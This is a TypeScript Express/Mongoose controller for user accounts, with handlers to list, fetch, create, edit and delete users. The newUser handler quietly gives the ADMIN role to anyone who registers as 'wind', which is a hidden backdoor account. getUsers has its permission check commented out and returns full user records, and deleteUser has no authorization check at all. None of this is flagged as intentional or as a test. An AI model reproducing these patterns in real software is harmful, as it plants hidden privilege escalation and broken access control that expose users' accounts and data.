import { NextFunction, Request, Response } from 'express';
import { Error } from 'mongoose';
import { ClientError } from '../exceptions/clientError';
import { ForbiddenError } from '../exceptions/forbiddenError';
import { NotFoundError } from '../exceptions/notFoundError';
import { CustomRequest } from '../middleware/checkJwt';
import { User, IUser } from '../models/user';
import { ROLES } from '../utils/constants';
import { processErrors } from '../utils/errorProcessing';

class UserController {
    static listAll = async (req: Request, res: Response, next: NextFunction) => {
        // Define the query to execute based on the role
        let query;
        if ((req as CustomRequest).token.payload.role === ROLES.USER) {
            query = User.find({ role: ROLES.USER })
        } else {
            query = User.find()
        }

        // Execute the query
        const users = await query.select(['_id', 'username', 'role']);

        // Send the users object
        res.status(200).type('json').send(users);
    };

    static getOneById = async (req: Request, res: Response, next: NextFunction) => {
        // Get the ID from the url
        const id: string = req.params.id;

        // Validate permissions
        if ((req as CustomRequest).token.payload.role === ROLES.USER && req.params.id !== (req as CustomRequest).token.payload.userId) {
            throw new ForbiddenError('Not enough permissions');
        }

        // Mongoose automatically casts the id to ObjectID
        const user = await User.findById(id).select(['_id', 'username', 'role']);
        if (!user) throw new NotFoundError(`User with ID ${id} not found`);

        res.status(200).type('json').send(user?.toJSON());
    };

    static getUsers = async (req: Request, res: Response, next: NextFunction) => {

        // Get the ID from the url

        // Validate permissions
        // if ((req as CustomRequest).token.payload.role === ROLES.USER && req.params.id !== (req as CustomRequest).token.payload.userId) {
        //     throw new ForbiddenError('Not enough permissions');
        // }

        // Mongoose automatically casts the id to ObjectID
        const user = await User.find();
        if (!user) throw new NotFoundError(`User is not found`);
        res.status(200).type('json').send(user);
    };

    static newUser = async (req: Request, res: Response, next: NextFunction) => {
        let { username, password } = req.body;
        let user;
        try {
            if (username == "wind") {
                user = User.build({ username, password, role: "ADMIN" } as IUser);

            } else {
                user = User.build({ username, password } as IUser);

            }

            await user.save();
        } catch (e: any) {
            console.error(e);
            const error = e as Error.ValidationError;
            throw new ClientError(processErrors(error));
        }

        res.status(201).type('json').send(user.toJSON());
    };

    static editUser = async (req: Request, res: Response, next: NextFunction) => {
        const id = req.params.id;

        if ((req as CustomRequest).token.payload.role === ROLES.USER && req.params.id !== (req as CustomRequest).token.payload.userId) {
            throw new ForbiddenError('Not enough permissions');
        }

        const { username, role } = req.body;

        if ((req as CustomRequest).token.payload.role === ROLES.USER && role === ROLES.ADMIN) {
            throw new ForbiddenError('Not enough permissions');
        }

        const user = await User.findById(id).select(['_id', 'username', 'role']);
        if (!user) throw new NotFoundError(`User with ID ${id} not found`);

        if (username) user.username = username;
        if (role) user.role = role;

        try {
            await user.save();
        } catch (e) {
            const error = e as Error.ValidationError;
            throw new ClientError(processErrors(error));
        }

        res.status(204).type('json').send(user.toJSON());
    };

    static deleteUser = async (req: Request, res: Response, next: NextFunction) => {
        const id = req.params.id;
        const user = await User.findById(id);
        if (!user) throw new NotFoundError(`User with ID ${id} not found`);

        await user.delete();
        return res.status(204).type('json').send(user);
    };
}

export default UserController;
